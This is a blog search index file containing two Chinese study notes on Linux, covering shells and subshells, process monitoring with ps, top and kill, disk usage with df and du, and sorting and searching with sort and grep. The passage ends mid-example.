<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linux学习-第五章</title>
      <link href="/posts/myh10011.html"/>
      <url>/posts/myh10011.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="五、理解shell"><a href="#五、理解shell" class="headerlink" title="五、理解shell"></a>五、理解shell</h2><h3 id="5-1-shell-的类型"><a href="#5-1-shell-的类型" class="headerlink" title="5.1 shell 的类型"></a>5.1 shell 的类型</h3><p>系统启动什么样的shell程序取决于你个人的用户ID配置。在<code>/etc/passwd</code>文件中，在用户ID记录的第7个字段中列出了默认的shell程序。只要用户登录到某个虚拟控制台终端或是在GUI中启动终端仿真器，<strong>默认的shell程序就会开始运行</strong>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /etc/passwdlighthouse:x:1000:1000::/home/lighthouse:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>bash shell程序位于/bin目录内。从长列表中可以看出<code>/bin/bash</code>（ bash shell）是一个<strong>可执行程序</strong>：  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ls -lF /bin/bash</span>-rwxr-xr-x <span class="token number">1</span> root root <span class="token number">1168776</span> Apr <span class="token number">18</span>  <span class="token number">2019</span> /bin/bash*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>默认的交互shell</strong>会在用户登录某个虚拟控制台终端或在GUI中运行终端仿真器时启动。不过还有另外一个默认shell是<code>/bin/sh</code>，它作为默认的<strong>系统shell</strong>，用于那些需要在启动时使用的系统shell脚本。  </p><p>经常会看到某些发行版使用<strong>软链</strong>接将默认的系统shell设置成bash shell：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ls -lF /bin/sh</span>lrwxrwxrwx <span class="token number">1</span> root root <span class="token number">4</span> Nov <span class="token number">25</span> <span class="token number">15</span>:30 /bin/sh -<span class="token operator">&gt;</span> bash*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>有些发行版上，默认的系统shell和默认的交互shell并不相同：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /etc/passwd<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>christine:x:1000:1000:Christine,,,:/home/christine:/bin/bash$$ <span class="token function">ls</span> -l /bin/shlrwxrwxrwx <span class="token number">1</span> root root <span class="token number">4</span> Apr <span class="token number">22</span> <span class="token number">12</span>:33 /bin/sh -<span class="token operator">&gt;</span> dash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-2-shell-的父子关系"><a href="#5-2-shell-的父子关系" class="headerlink" title="5.2 shell 的父子关系"></a>5.2 shell 的父子关系</h3><p>用于登录某个虚拟控制器终端或在GUI中运行终端仿真器时所启动的默认的交互shell，是一个<strong>父shell</strong>。  在CLI提示符后输入<code>/bin/bash</code>命令或其他等效的<code>bash</code>命令时， 会创建一个新的shell程序。这个shell程序被称为<strong>子shell（ child shell）</strong>。子shell也拥有CLI提示符，同样会等待命令输入。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ps -f</span><span class="token environment constant">UID</span>        PID  <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMDroot      <span class="token number">8068</span>  <span class="token number">8050</span>  <span class="token number">0</span> <span class="token number">19</span>:48 pts/0    00:00:00 -bashroot     <span class="token number">12611</span>  <span class="token number">8068</span>  <span class="token number">0</span> <span class="token number">20</span>:06 pts/0    00:00:00 <span class="token function">ps</span> -froot@VM-16-11-debian:~<span class="token comment"># bash  //创建子shell</span>root@VM-16-11-debian:~<span class="token comment"># bash  //子shell中创建子shell</span>root@VM-16-11-debian:~<span class="token comment"># bash</span>root@VM-16-11-debian:~<span class="token comment"># ps --forest</span>  PID TTY          TIME CMD <span class="token number">8068</span> pts/0    00:00:00 <span class="token function">bash</span><span class="token number">14850</span> pts/0    00:00:00  <span class="token punctuation">\</span>_ <span class="token function">bash</span><span class="token number">14858</span> pts/0    00:00:00      <span class="token punctuation">\</span>_ <span class="token function">bash</span><span class="token number">14861</span> pts/0    00:00:00          <span class="token punctuation">\</span>_ <span class="token function">bash</span><span class="token number">14994</span> pts/0    00:00:00              <span class="token punctuation">\</span>_ <span class="token function">ps</span>root@VM-16-11-debian:~<span class="token comment"># exit</span><span class="token builtin class-name">exit</span>  //exit退出shellroot@VM-16-11-debian:~<span class="token comment"># exit</span><span class="token builtin class-name">exit</span>root@VM-16-11-debian:~<span class="token comment"># exit</span><span class="token builtin class-name">exit</span>root@VM-16-11-debian:~<span class="token comment"># ps -f</span><span class="token environment constant">UID</span>        PID  <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMDroot      <span class="token number">8068</span>  <span class="token number">8050</span>  <span class="token number">0</span> <span class="token number">19</span>:48 pts/0    00:00:00 -bashroot     <span class="token number">15204</span>  <span class="token number">8068</span>  <span class="token number">0</span> <span class="token number">20</span>:17 pts/0    00:00:00 <span class="token function">ps</span> -f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入命令bash之后，一个子shell就出现了。第二个ps -f是在子shell中执行的。可以从显示结果中看到有两个bash shell程序在运行。第一个bash shell程序，也就是父shell进程，其原始进程ID是1814。第二个bash shell程序， 即子shell进程，其PID是2430。注意，子shell的<strong>父进程ID（ PPID）是1841</strong>，指明了<strong>这个父shell进程就是该子shell的父进程</strong>。  </p><img src="E:\myblog\source\_posts\Linux学习-第五章.assets\5.1.png" style="zoom:150%;"><h4 id="5-2-1-进程列表"><a href="#5-2-1-进程列表" class="headerlink" title="5.2.1 进程列表"></a>5.2.1 进程列表</h4><p>命令之间加入分号（ ;）可以依次运行的一系列命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># pwd ; ls ; cd /etc ; pwd </span>/rootdisk.sh  install.sh  <span class="token function">mc</span>/etc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>不过这并不是进程列表。命令列表要想成为进程列表，这些命令<font color="#FF5E3A" size="3">必须包含在括号里</font>。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment">#(pwd ; ls ; cd /etc ; pwd )</span>/rootdisk.sh  install.sh  <span class="token function">mc</span>/etc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>虽然结果没有不同但是括号的加入使命令列表变成了进程列表，<font color="#FF5E3A" size="3">生成了一个子shell来执行对应的命令</font>。  </p><p>要想知道是否生成了子shell，得<strong>借助一个使用了环境变量的命令</strong>。（环境变量会在第6章中详述。）这个命令就是<code>echo $BASH_SUBSHELL</code>。如果该命令返回0，就表明没有子shell。如果返回<strong>1或者其他更大的数字</strong>，就表明存在子shell。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># (pwd ; ls ; cd /etc ; pwd; echo $BASH_SUBSHELL)</span>/rootdisk.sh  install.sh  <span class="token function">mc</span>/etc<span class="token number">1</span><span class="token comment">#嵌套</span>$ <span class="token punctuation">(</span> <span class="token builtin class-name">pwd</span> <span class="token punctuation">;</span> <span class="token punctuation">(</span>echo <span class="token variable">$BASH_SUBSHELL</span><span class="token punctuation">))</span>/home/Christine<span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在shell脚本中，经常使用子shell进行多进程处理。但是采用子shell的成本不菲，会明显拖慢处理速度。在交互式的CLI shell会话中，子shell同样存在问题。它<strong>并非真正的多进程处理</strong>，因为终端控制着子shell的I/O。  </p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习-第四章</title>
      <link href="/posts/myh10010.html"/>
      <url>/posts/myh10010.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr><h2 id="第四章：进阶bash-shell命令"><a href="#第四章：进阶bash-shell命令" class="headerlink" title="第四章：进阶bash shell命令"></a>第四章：进阶bash shell命令</h2><h3 id="4-1-监测程序"><a href="#4-1-监测程序" class="headerlink" title="4.1 监测程序"></a>4.1 监测程序</h3><h4 id="4-1-1-探查进程"><a href="#4-1-1-探查进程" class="headerlink" title="4.1.1 探查进程"></a>4.1.1 探查进程</h4><p>在讲探查进程之前先说明一下什么是进程。<font color="#FF5E3A" size="3">进程：运行在系统上的程序。</font>要监测这些进程，需要熟悉<code>ps命令</code>的用法。 ps命令好比工具中的瑞士军刀，它能输出运行在系统上的所有程序的许多信息。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ps</span>  PID TTY          TIME CMD<span class="token number">26084</span> pts/0    00:00:00 <span class="token function">bash</span><span class="token number">26098</span> pts/0    00:00:00 <span class="token function">ps</span><span class="token comment">#PID : Process ID,显示了当前程序的进程ID</span><span class="token comment">#TTY : 属于哪个终端</span><span class="token comment">#TIME: 运行的时长</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>默认情况下， ps命令只会显示运行在当前控制台下的属于当前用户的进程。  此例我们只运行了bash shell（注意， <font color="#FF5E3A" size="3">shell也只是运行在系统上的另一个程序而已</font>）以及ps命令本身。  下面讲解一下<code>ps</code>命令对应的部分参数及其作用:</p><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">-A</td><td align="center">显示所有进程</td></tr><tr><td align="center">-N</td><td align="center">显示与指定参数<font color="#FF5E3A" size="3">不符</font>的所有进程</td></tr><tr><td align="center">-a</td><td align="center">显示除控制进程（ session leader）和无终端进程外的所有进程</td></tr><tr><td align="center">-d</td><td align="center">显示除控制进程外的所有进程</td></tr><tr><td align="center">-e</td><td align="center">显示所有进程</td></tr><tr><td align="center">-c</td><td align="center">显示进程的额外调度器信息</td></tr><tr><td align="center">-f</td><td align="center">显示完整格式的输出</td></tr><tr><td align="center">-l</td><td align="center">显示长列表</td></tr></tbody></table><p>命令参数还有很多，也不需要都记住，只需要记住最常用的就好。经常把参数组合起来用是不错的方法，比如<code>-ef</code>命令，可以查看系统上运行的所有进程并且显示一些经常需要的信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ps -ef</span><span class="token environment constant">UID</span>        PID  <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMDroot         <span class="token number">1</span>     <span class="token number">0</span>  <span class="token number">0</span> Jan21 ?        00:00:02 /sbin/initroot         <span class="token number">2</span>     <span class="token number">0</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>kthreadd<span class="token punctuation">]</span>root         <span class="token number">3</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>rcu_gp<span class="token punctuation">]</span>root         <span class="token number">4</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>rcu_par_gp<span class="token punctuation">]</span>root         <span class="token number">6</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>kworker/0:0H-kblockd<span class="token punctuation">]</span>root         <span class="token number">7</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>kworker/u4:0-events_unbound<span class="token punctuation">]</span>root         <span class="token number">8</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>mm_percpu_wq<span class="token punctuation">]</span>root         <span class="token number">9</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:01 <span class="token punctuation">[</span>ksoftirqd/0<span class="token punctuation">]</span>root        <span class="token number">10</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:29 <span class="token punctuation">[</span>rcu_sched<span class="token punctuation">]</span>root        <span class="token number">11</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>rcu_bh<span class="token punctuation">]</span>……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li> UID：启动这些进程的用户。</li><li> PID：进程的进程ID。</li><li> PPID：父进程的进程号（如果该进程是由另一个进程启动的）。</li><li> C：进程生命周期中的CPU利用率。</li><li> STIME：进程启动时的系统时间。</li><li> TTY：进程启动时的终端设备。</li><li> TIME：运行进程需要的累计CPU时间。</li><li> CMD：启动的程序名称  </li></ul><p>如果需要更多信息使用<code>-l</code>参数，也可以结合使用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ps -le</span>F S   <span class="token environment constant">UID</span>   PID  <span class="token environment constant">PPID</span>  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD<span class="token number">4</span> S     <span class="token number">0</span>     <span class="token number">1</span>     <span class="token number">0</span>  <span class="token number">0</span>  <span class="token number">80</span>   <span class="token number">0</span> - <span class="token number">26326</span> do_epo ?        00:00:02 systemd<span class="token number">1</span> S     <span class="token number">0</span>     <span class="token number">2</span>     <span class="token number">0</span>  <span class="token number">0</span>  <span class="token number">80</span>   <span class="token number">0</span> -     <span class="token number">0</span> -      ?        00:00:00 kthreadd<span class="token number">1</span> I     <span class="token number">0</span>     <span class="token number">3</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">60</span> -20 -     <span class="token number">0</span> -      ?        00:00:00 rcu_gp<span class="token number">1</span> I     <span class="token number">0</span>     <span class="token number">4</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">60</span> -20 -     <span class="token number">0</span> -      ?        00:00:00 rcu_par_gp<span class="token number">1</span> I     <span class="token number">0</span>     <span class="token number">6</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">60</span> -20 -     <span class="token number">0</span> -      ?        00:00:00 kworker/0:0H-kblockd<span class="token number">1</span> I     <span class="token number">0</span>     <span class="token number">7</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">80</span>   <span class="token number">0</span> -     <span class="token number">0</span> -      ?        00:00:00 kworker/u4:0-events_unbound<span class="token number">1</span> I     <span class="token number">0</span>     <span class="token number">8</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">60</span> -20 -     <span class="token number">0</span> -      ?        00:00:00 mm_percpu_wq<span class="token number">1</span> S     <span class="token number">0</span>     <span class="token number">9</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">80</span>   <span class="token number">0</span> -     <span class="token number">0</span> -      ?        00:00:01 ksoftirqd/0<span class="token number">1</span> I     <span class="token number">0</span>    <span class="token number">10</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">80</span>   <span class="token number">0</span> -     <span class="token number">0</span> -      ?        00:00:29 rcu_sched<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li> F：内核分配给进程的系统标记。</li><li> S：进程的状态（ O代表正在运行； S代表在休眠； R代表可运行，正等待运行； Z代表僵化，进程已结束但父进程已不存在； T代表停止）。</li><li> PRI：进程的优先级（越大的数字代表越低的优先级）。</li><li> NI：谦让度值用来参与决定优先级。</li><li> ADDR：进程的内存地址。</li><li> SZ：假如进程被换出，所需交换空间的大致大小。</li><li> WCHAN：进程休眠的内核函数的地址。 </li></ul><h4 id="4-1-2-实时探测进程"><a href="#4-1-2-实时探测进程" class="headerlink" title="4.1.2 实时探测进程"></a>4.1.2 实时探测进程</h4><p>ps命令虽然在收集运行在系统上的进程信息时非常有用，但也有不足之处：它只能显示某个特定时间 。如果想观察那些频繁换进换出的内存的进程趋势，用ps命令就不方便了。  <code>top</code>命令刚好适用这种情况。 top命令跟ps命令相似，能够显示进程信息，但它是实时显的。  </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux4/202201221838032.png"></p><p>输出的第一部分显示的是<font color="#FF5E3A" size="3">系统的概况</font>：第一行显示了当前时间、系统的运行时间、登录的用户数以及系统的平均负载。平均负载有3个值：最近1分钟的、最近5分钟的和最近15分钟的平均负载。值越大说明系统的负载越高。由于进程短期的突发性活动，出现最近1分钟的高负载值也很常见，但如果<strong>近15分钟内的平均负载都很高，就说明系统可能有问题</strong>。  </p><hr><p>说明:Linux系统管理的要点在于定义究竟到什么程度才算是高负载。这个值取决于系统的硬件配置以及系统上通常运行的程序。对某个系统来说是高负载的值可能对另一系统来说就是正常值。通常，如果系统的<strong>负载值超过了2</strong>，就说明系统比较繁忙了。  </p><hr><p>第二行显示了进程概要信息——<font color="#FF5E3A" size="3">top命令的输出中将进程叫作任务（ task）</font>：有多少进程处在运行、休眠、停止或是僵化状态（僵化状态是指进程完成了，但父进程没有响应）。  </p><p>第三行显示了<font color="#FF5E3A" size="3">CPU的概要信息</font>。 top根据进程的属主（用户还是系统）和进程的状态（运行、空闲还是等待）将CPU利用率分成几类输出。 </p><p>紧跟其后的两行说明了<font color="#FF5E3A" size="3">系统内存的状态</font>。第一行说的是系统的物理内存：总共有多少内存，当前用了多少，还有多少空闲。后一行说的是同样的信息，不过是针对系统交换空间（如果分配了的话）的状态而言的。   </p><p>后一部分显示了当前运行中的进程的详细列表，有些列跟ps命令的输出类似：</p><ul><li> PID：进程的ID。</li><li> USER：进程属主的名字。</li><li> PR：进程的优先级。</li><li> NI：进程的谦让度值。</li><li> VIRT：进程占用的虚拟内存总量。</li><li> RES：进程占用的物理内存总量。</li><li> SHR：进程和其他进程共享的内存总量。</li><li> S：进程的状态（ D代表可中断的休眠状态， R代表在运行状态， S代表休眠状态， T代表跟踪状态或停止状态， Z代表僵化状态，<code>I</code>代表空闲的任务（进程），这是比较新版的内核中新增的状态。）</li><li> %CPU：进程使用的CPU时间比例。</li><li> %MEM：进程使用的内存占可用内存的比例。  </li><li> TIME+：自进程启动到目前为止的CPU时间总量。  </li><li> COMMAND：进程所对应的命令行名称，也就是启动的程序名。  </li></ul><p>在top命令运行时键入可改变top的行为。键入f允许你选择对输出进行排序的字段，键入d允许你修改轮询间隔。<strong>键入q可以退出top</strong>。  </p><h4 id="4-1-3-结束进程"><a href="#4-1-3-结束进程" class="headerlink" title="4.1.3 结束进程"></a>4.1.3 结束进程</h4><p>有时进程挂起了，只需要动动手让进程重新运行或结束就行了。但有时，有的进程会耗尽CPU且不释放资源。在这两种情景下，你就需要能控制进程的命令。 Linux沿用了Unix进行<font color="#FF5E3A" size="3">进程间通信的方法</font>。 在Linux中，<font color="#FF5E3A" size="3">进程之间通过信号来通信</font>。进程的信号就是预定义好的一个消息，<font color="#FF5E3A" size="3">进程能识别它并决定忽略还是作出反应</font>。进程如何处理信号是由开发人员通过编程来决定的。大多数编写完善的程序都能接收和处理标准Unix进程信号。   </p><table><thead><tr><th align="center">信号</th><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">HUP</td><td align="center">挂起</td></tr><tr><td align="center">2</td><td align="center">INT</td><td align="center">中断</td></tr><tr><td align="center">3</td><td align="center">QUIT</td><td align="center">结束运行</td></tr><tr><td align="center">9</td><td align="center">KILL</td><td align="center">无条件终止</td></tr><tr><td align="center">11</td><td align="center">SEGV</td><td align="center">段错误</td></tr><tr><td align="center">15</td><td align="center">TERM</td><td align="center">尽可能终止</td></tr><tr><td align="center">17</td><td align="center">STOP</td><td align="center">无条件停止运行，但不终止</td></tr><tr><td align="center">18</td><td align="center">TSTP</td><td align="center">停止或暂停，但继续在后台运行</td></tr><tr><td align="center">19</td><td align="center">CONT</td><td align="center">在STOP或TSTP之后恢复执行</td></tr></tbody></table><p><code>kill命令</code> ：</p><p>要发送进程信号，你<font color="#FF5E3A" size="3">必须是进程的属主或登录为root用户</font>。  kill命令可通过进程ID（ PID）给进程发信号。默认情况下， kill命令会向命令行中列出的全部PID发送一个TERM信号。遗憾的是，你只能用进程的PID而不能用命令名，所以kill命令有时并不好用。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">kill</span> <span class="token number">3940</span>-bash: kill: <span class="token punctuation">(</span><span class="token number">3940</span><span class="token punctuation">)</span> - Operation not permitted$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>TERM信号告诉进程可能的话就停止运行。不过，如果有不服管教的进程，那它通常<strong>会忽略这个请求</strong>。如果要强制终止， -s参数支持指定其他信号（用信号名或信号值）。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># kill -s HUP 3940</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看出kill命令不会有任何输出。 要<strong>检查kill命令是否有效，可再运行ps或top命令</strong>，看看问题进程是否已停止。 </p><p><code>killall</code>命令：</p><p>killall命令支持通过进程名而不是PID来结束进程。 killall命令也支持通配符，这在系统因负载过大而变得很慢时很有用。   </p><hr><p><font color="red" size="3">警告</font> 以root用户身份登录系统时，使用killall命令要特别小心，因为很容易就会误用通配符而结束了重要的系统进程。这可能会破坏文件系统。</p><hr><h3 id="4-2-监测磁盘空间"><a href="#4-2-监测磁盘空间" class="headerlink" title="4.2 监测磁盘空间"></a>4.2 监测磁盘空间</h3><h4 id="4-2-1-df-命令"><a href="#4-2-1-df-命令" class="headerlink" title="4.2.1 df 命令"></a>4.2.1 <code>df </code>命令</h4><p>df命令可以方便地查看所有<strong>已挂载磁盘</strong>的使用情况。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">df</span>Filesystem     1K-blocks    Used Available Use% Mounted onudev             <span class="token number">1939124</span>       <span class="token number">0</span>   <span class="token number">1939124</span>   <span class="token number">0</span>% /devtmpfs             <span class="token number">391044</span>   <span class="token number">39556</span>    <span class="token number">351488</span>  <span class="token number">11</span>% /run/dev/vda1       <span class="token number">82503044</span> <span class="token number">5996440</span>  <span class="token number">73051148</span>   <span class="token number">8</span>% /tmpfs            <span class="token number">1955208</span>      <span class="token number">32</span>   <span class="token number">1955176</span>   <span class="token number">1</span>% /dev/shm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li> 设备的设备文件位置；</li><li> 能容纳多少个1024字节大小的块；</li><li> 已用了多少个1024字节大小的块；</li><li> 还有多少个1024字节大小的块可用；</li><li> 已用空间所占的比例；</li><li> 设备挂载到了哪个挂载点上  </li></ul><p>一个常用的参数是<code>-h</code>。它会把输出中的磁盘空间按照用户易读的形式显示，通常用M来替代兆字节，用G替代吉字节。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">df</span> -hFilesystem      Size  Used Avail Use% Mounted onudev            <span class="token number">1</span>.9G     <span class="token number">0</span>  <span class="token number">1</span>.9G   <span class="token number">0</span>% /devtmpfs           382M   39M  344M  <span class="token number">11</span>% /run/dev/vda1        79G  <span class="token number">5</span>.8G   70G   <span class="token number">8</span>% /tmpfs           <span class="token number">1</span>.9G   32K  <span class="token number">1</span>.9G   <span class="token number">1</span>% /dev/shm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-2-2-du命令"><a href="#4-2-2-du命令" class="headerlink" title="4.2.2 du命令"></a>4.2.2 <code>du</code>命令</h4><p>du命令可以显示某个特定目录（默认情况下是当前目录）的磁盘使用情况。这一方法可用来快速判断系统上某个目录下是不是有超大文件。  </p><p>默认情况下， du命令会显示当前目录下所有的文件、目录和子目录的磁盘使用情况，它会以磁盘块为单位来表明每个文件或目录占用了多大存储空间。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">du</span><span class="token number">484</span> ./.gstreamer-0.10<span class="token number">8</span> ./Templates<span class="token number">8</span> ./Download<span class="token number">8</span> ./.ccache/7/0<span class="token number">24</span> ./.ccache/7<span class="token number">368</span> ./.ccache/a/d<span class="token number">384</span> ./.ccache/a<span class="token number">424</span> ./.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每行输出左边的数值是每个文件或目录占用的<strong>磁盘块数</strong>。列表是从目录层级的<strong>最底部开始</strong>，然后按文件、子目录、目录逐级向上。  同理，也有<code>-h</code>参数按用户易读的格式输出大小 。</p><h3 id="4-3-处理数据文件"><a href="#4-3-处理数据文件" class="headerlink" title="4.3 处理数据文件"></a>4.3 处理数据文件</h3><h4 id="4-3-1-排序数据"><a href="#4-3-1-排序数据" class="headerlink" title="4.3.1 排序数据"></a>4.3.1 排序数据</h4><p><code>sort</code>命令按照会话指定的默认语言的排序规则对文本文件中的数据行排序。 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> file1onetwothreefourfive$ <span class="token function">sort</span> file1fivefouronethreetwo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 但是如果对数字进行排序，可能会出点差错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> file2<span class="token number">1</span><span class="token number">2</span><span class="token number">100</span><span class="token number">45</span><span class="token number">3</span><span class="token number">10</span><span class="token number">145</span>$ <span class="token function">sort</span> file2<span class="token number">1</span><span class="token number">10</span><span class="token number">100</span><span class="token number">145</span><span class="token number">2</span><span class="token number">3</span><span class="token number">45</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>默认情况下， sort命令会把<strong>数字当做字符来执行</strong>标准的字符排序。解决这个问题可用-n参数 ，告诉sort命令把数字识别成数字而不是字符，并且按值排序  。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sort</span> -n file2<span class="token number">1</span><span class="token number">2</span><span class="token number">3</span><span class="token number">10</span><span class="token number">45</span><span class="token number">100</span><span class="token number">145</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另一个常用的参数是-M，按月排序。 Linux的<strong>日志文件</strong>经常会在每行的<strong>起始位置有一个时间戳</strong>，用来表明事件是什么时候发生的。如果用-M参数， sort命令就能识别三字符的月份名，并相应地排序。   </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Sep <span class="token number">13</span> 07:10:09 testbox smartd<span class="token punctuation">[</span><span class="token number">2718</span><span class="token punctuation">]</span>: Device: /dev/sda, opened  <span class="token comment">#日志文件</span>$ <span class="token function">sort</span> -M file3JanFebMarApr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>常用参数：</p><table><thead><tr><th align="center">参数</th><th align="center">描 述</th></tr></thead><tbody><tr><td align="center">-f</td><td align="center">参数会忽略大小写</td></tr><tr><td align="center">-r</td><td align="center">反序排序（升序变成降序）</td></tr><tr><td align="center">-t</td><td align="center">指定一个用来区分键位置的字符</td></tr><tr><td align="center">-n</td><td align="center">按字符串数值来排序（并不转换为浮点数）</td></tr><tr><td align="center">-g</td><td align="center">按通用数值来排序（跟-n不同，把值当浮点数来排序，支持科学 计数法表示的值）</td></tr></tbody></table><p>-k和-t参数在对按字段分隔的数据进行排序时非常有用，例如/etc/passwd文件。可以用-t参数来指定字段分隔符，然后用-k参数来指定排序的字段。举个例子，要对前面提到的密码文件/etc/passwd根据用户ID进行数值排序，可以这么做：  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sort</span> -t <span class="token string">':'</span> -k <span class="token number">3</span> -n /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/sync<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 此时数据已经按第三个字段——用户ID的数值排序。</p><h4 id="4-3-2-搜索数据"><a href="#4-3-2-搜索数据" class="headerlink" title="4.3.2 搜索数据"></a>4.3.2 搜索数据</h4><p>格式：<code>grep [options] pattern [file]  </code></p><p><code>grep</code>命令会在输入或指定的文件中查找包含匹配指定模式的字符的行。 grep的输出就是包含了匹配模式的行（并不是行号是一行内容）。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># cat 